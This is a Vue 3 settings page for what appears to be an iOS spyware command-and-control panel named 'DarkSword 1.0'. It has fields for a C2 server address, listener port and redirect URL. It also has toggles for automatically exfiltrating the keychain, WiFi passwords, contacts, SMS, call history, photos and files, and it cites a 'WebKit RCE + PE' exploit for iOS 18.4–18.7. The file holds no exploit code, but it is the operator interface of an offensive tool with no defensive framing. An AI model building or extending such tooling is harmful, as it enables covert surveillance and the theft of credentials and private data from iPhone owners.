<template>
  <div class="system-settings">
    <el-card>
      <el-tabs v-model="activeTab">
        <el-tab-pane label="C2 Server Config" name="c2">
          <el-form :model="c2Settings" label-width="150px">
            <el-form-item label="C2 Server Address">
              <el-input v-model="c2Settings.c2_host" placeholder="http://c2.example.com:8080" />
            </el-form-item>
            <el-form-item label="Listen Address">
              <el-input v-model="c2Settings.listen_host" placeholder="0.0.0.0" />
            </el-form-item>
            <el-form-item label="Listen Port">
              <el-input-number v-model="c2Settings.listen_port" :min="1" :max="65535" />
            </el-form-item>
            <el-form-item label="Redirect URL">
              <el-input v-model="c2Settings.redirect_url" placeholder="https://www.example.com" />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" @click="saveC2Settings">Save Config</el-button>
            </el-form-item>
          </el-form>
        </el-tab-pane>
        
        <el-tab-pane label="Exploit Config" name="exploit">
          <el-form :model="exploitSettings" label-width="150px">
            <el-form-item label="Auto Exfiltration">
              <el-switch v-model="exploitSettings.auto_exfil" />
            </el-form-item>
            <el-form-item label="Exfil Categories">
              <el-select v-model="exploitSettings.exfil_categories" multiple style="width: 100%;">
                <el-option label="Keychain" value="keychain" />
                <el-option label="WiFi Passwords" value="wifi" />
                <el-option label="Contacts" value="contacts" />
                <el-option label="SMS" value="sms" />
                <el-option label="Call History" value="calls" />
                <el-option label="Photos" value="photos" />
                <el-option label="Files" value="files" />
              </el-select>
            </el-form-item>
            <el-form-item label="Command Poll Interval (s)">
              <el-input-number v-model="exploitSettings.poll_interval" :min="5" :max="300" />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" @click="saveExploitSettings">Save Config</el-button>
            </el-form-item>
          </el-form>
        </el-tab-pane>
        
        <el-tab-pane label="System Info" name="info">
          <el-descriptions :column="2" border>
            <el-descriptions-item label="Version">DarkSword 1.0</el-descriptions-item>
            <el-descriptions-item label="Database">SQLite</el-descriptions-item>
            <el-descriptions-item label="Backend">FastAPI</el-descriptions-item>
            <el-descriptions-item label="Frontend">Vue 3 + Element Plus</el-descriptions-item>
            <el-descriptions-item label="Exploit Type">WebKit RCE + PE</el-descriptions-item>
            <el-descriptions-item label="Supported iOS">18.4 - 18.7</el-descriptions-item>
          </el-descriptions>
        </el-tab-pane>
      </el-tabs>
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive } from 'vue'
import axios from '../utils/axios'

const activeTab = ref('c2')

const c2Settings = reactive({
  c2_host: '',
  listen_host: '0.0.0.0',
  listen_port: 8080,
  redirect_url: ''
})

const exploitSettings = reactive({
  auto_exfil: true,
  exfil_categories: ['keychain', 'wifi', 'contacts'],
  poll_interval: 30
})

async function loadSettings() {
  try {
    const response = await axios.get('/api/settings')
    Object.assign(c2Settings, response.data.c2 || {})
    Object.assign(exploitSettings, response.data.exploit || {})
  } catch (error) {
    console.error('Failed to load config:', error)
  }
}

async function saveC2Settings() {
  try {
    await axios.put('/api/settings/c2', c2Settings)
    alert('Config saved')
  } catch (error) {
    console.error('Save failed:', error)
  }
}

async function saveExploitSettings() {
  try {
    await axios.put('/api/settings/exploit', exploitSettings)
    alert('Config saved')
  } catch (error) {
    console.error('Save failed:', error)
  }
}

loadSettings()
</script>
